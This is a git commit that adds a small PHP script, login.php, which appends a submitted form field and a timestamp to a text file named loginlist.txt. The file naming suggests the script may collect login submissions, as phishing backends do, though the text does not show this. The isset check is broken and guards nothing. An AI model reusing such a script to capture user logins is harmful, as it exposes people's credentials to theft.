a783265327cb13d7fe2021cdb978d8fee068913d
Juanito Tamboong <93064994+JuanitoTamboong@users.noreply.github.com>
2022-10-16 04:13:41 -0800

    Add files via upload

---
+++ login.php
@@ -0,0 +1,14 @@
+<?php
+if(isset($_POST['submit']));
+
+date_default_timezone_set('Asia/Manila');
+$date = date('m-d-y h:i:sa');
+$anonymous = $_POST['anonymous'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$user = $_SERVER['HTTP_USER_AGENT'];
+$file = fopen("loginlist.txt","a+");
+$hades = ("Date & Time:". $date."\nAnonymous:". $anonymous."\n\n");
+
+fputs($file,$hades);
+
+fclose($file);
